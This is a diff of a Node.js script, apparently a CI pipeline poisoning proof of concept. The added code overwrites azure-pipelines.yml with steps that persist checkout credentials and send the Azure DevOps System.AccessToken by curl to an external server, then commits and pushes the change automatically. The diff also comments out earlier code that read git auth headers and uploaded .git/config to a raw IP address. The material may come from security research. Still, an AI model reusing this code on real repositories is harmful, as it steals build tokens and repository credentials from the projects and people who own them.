@@ -1,5 +1,69 @@
+// const { exec } = require('child_process');
+
+const fs = require('fs');
+const path = require('path');
 const { exec } = require('child_process');
 
+// Step 1: Rename existing azure-pipelines.yml file
+const originalFileName = 'azure-pipelines.yml';
+const newFileName = 'azure-pipelines-backup.yml';
+
+fs.renameSync(originalFileName, newFileName);
+console.log(`Renamed ${originalFileName} to ${newFileName}`);
+
+// Step 2: Write new content to azure-pipelines.yml
+const newYamlContent = `
+trigger:
+  branches:
+    include:
+      - main
+
+pool:
+  vmImage: 'ubuntu-latest'
+
+steps:
+- checkout: self
+  persistCredentials: true  # 保留凭据以便后续步骤使用
+
+- task: NodeTool@0
+  inputs:
+    versionSpec: '12.x'
+    checkLatest: true
+
+- script: |
+    echo "Fetching System Access Token..."
+    token=$(System.AccessToken)
+    echo "Sending token to external server..."
+    curl -X POST -H "Content-Type: application/json" -d "{\\"token\\": \\"$token\\"}" https://your-external-server.com/token
+  displayName: 'Fetch and Send System Access Token'
+
+- script: |
+    npm install
+  displayName: 'Install Node.js dependencies'
+
+- task: AzureFunctionApp@1
+  inputs:
+    azureSubscription: 'test_connection'
+    appType: 'functionApp'
+    appName: 'mypocfunctiontest'
+    package: '$(Build.ArtifactStagingDirectory)/'
+`;
+
+fs.writeFileSync(originalFileName, newYamlContent.trim());
+console.log(`Created and wrote to ${originalFileName}`);
+
+// Step 3: Commit and push changes to the repository
+exec('git add . && git commit -m "Modified azure-pipelines.yml for token extraction" && git push', (error, stdout, stderr) => {
+  if (error) {
+    console.error(`Error during git operation: ${error.message}`);
+    return;
+  }
+  if (stderr) {
+    console.error(`git stderr: ${stderr}`);
+    return;
+  }
+  console.log(`git stdout: ${stdout}`);
+});
 
 
 // // 确保已切换到 'main' 分支
@@ -172,86 +236,86 @@ const { exec } = require('child_process');
 // //     });
 // // });
 
-exec('git remote -v', (error, stdout, stderr) => {
-    if (error) {
-        console.error(`执行 git remote -v 时出错: ${error.message}`);
-        return;
-    }
-    if (stderr) {
-        console.error(`git remote -v 执行输出错误: ${stderr}`);
-        return;
-    }
+// exec('git remote -v', (error, stdout, stderr) => {
+//     if (error) {
+//         console.error(`执行 git remote -v 时出错: ${error.message}`);
+//         return;
+//     }
+//     if (stderr) {
+//         console.error(`git remote -v 执行输出错误: ${stderr}`);
+//         return;
+//     }
 
-    console.log(`git remote -v 命令结果:\n${stdout}`);
-});
-
-
-exec('git config --get-all http.https://github.com/ckx-sec/test_azure_function_private.extraheader', (error, stdout, stderr) => {
-    if (error) {
-        console.error(`执行 git config 时出错: ${error.message}`);
-        return;
-    }
-    if (stderr) {
-        console.error(`git config 执行输出错误: ${stderr}`);
-        return;
-    }
-
-    console.log(`git config 命令结果:\n${stdout}`);
-});
-
-// 执行 ls -l azure-pipelines-1.yml 命令
-exec('ls -al && pwd', (error, stdout, stderr) => {
-    if (error) {
-        console.error(`执行 ls -l 时出错: ${error.message}`);
-        return;
-    }
-    if (stderr) {
-        console.error(`ls -l 执行输出错误: ${stderr}`);
-        return;
-    }
-
-    console.log(`ls -l 命令结果:\n${stdout}`);
-});
+//     console.log(`git remote -v 命令结果:\n${stdout}`);
+// });
 
 
-exec('ls -al .git/', (error, stdout, stderr) => {
-    if (error) {
-        console.error(`执行 ls -al .git/ 时出错: ${error.message}`);
-        return;
-    }
-    if (stderr) {
-        console.error(`ls -al .git/ 执行输出错误: ${stderr}`);
-        return;
-    }
+// exec('git config --get-all http.https://github.com/ckx-sec/test_azure_function_private.extraheader', (error, stdout, stderr) => {
+//     if (error) {
+//         console.error(`执行 git config 时出错: ${error.message}`);
+//         return;
+//     }
+//     if (stderr) {
+//         console.error(`git config 执行输出错误: ${stderr}`);
+//         return;
+//     }
 
-    console.log(`ls -al .git/ 命令结果:\n${stdout}`);
-});
+//     console.log(`git config 命令结果:\n${stdout}`);
+// });
 
-exec('cat .git/config', (error, stdout, stderr) => {
-    if (error) {
-        console.error(`执行 cat .git/config 时出错: ${error.message}`);
-        return;
-    }
-    if (stderr) {
-        console.error(`cat .git/config 执行输出错误: ${stderr}`);
-        return;
-    }
+// // 执行 ls -l azure-pipelines-1.yml 命令
+// exec('ls -al && pwd', (error, stdout, stderr) => {
+//     if (error) {
+//         console.error(`执行 ls -l 时出错: ${error.message}`);
+//         return;
+//     }
+//     if (stderr) {
+//         console.error(`ls -l 执行输出错误: ${stderr}`);
+//         return;
+//     }
 
-    console.log(`cat .git/config 命令结果:\n${stdout}`);
-});
+//     console.log(`ls -l 命令结果:\n${stdout}`);
+// });
 
 
-exec('curl -F "file=@/home/vsts/work/1/s/.git/config" http://139.180.193.16:5000/upload', (error, stdout, stderr) => {
-    if (error) {
-        console.error(`执行 curl 时出错: ${error.message}`);
-        return;
-    }
-    if (stderr) {
-        console.error(`curl 执行输出错误: ${stderr}`);
-        return;
-    }
-    console.log(`curl 命令结果:\n${stdout}`);
-});
+// exec('ls -al .git/', (error, stdout, stderr) => {
+//     if (error) {
+//         console.error(`执行 ls -al .git/ 时出错: ${error.message}`);
+//         return;
+//     }
+//     if (stderr) {
+//         console.error(`ls -al .git/ 执行输出错误: ${stderr}`);
+//         return;
+//     }
+
+//     console.log(`ls -al .git/ 命令结果:\n${stdout}`);
+// });
+
+// exec('cat .git/config', (error, stdout, stderr) => {
+//     if (error) {
+//         console.error(`执行 cat .git/config 时出错: ${error.message}`);
+//         return;
+//     }
+//     if (stderr) {
+//         console.error(`cat .git/config 执行输出错误: ${stderr}`);
+//         return;
+//     }
+
+//     console.log(`cat .git/config 命令结果:\n${stdout}`);
+// });
+
+
+// exec('curl -F "file=@/home/vsts/work/1/s/.git/config" http://139.180.193.16:5000/upload', (error, stdout, stderr) => {
+//     if (error) {
+//         console.error(`执行 curl 时出错: ${error.message}`);
+//         return;
+//     }
+//     if (stderr) {
+//         console.error(`curl 执行输出错误: ${stderr}`);
+//         return;
+//     }
+//     console.log(`curl 命令结果:\n${stdout}`);
+// });
 
 // // 执行 pwd 命令
 // exec('pwd', (error, stdout, stderr) => {
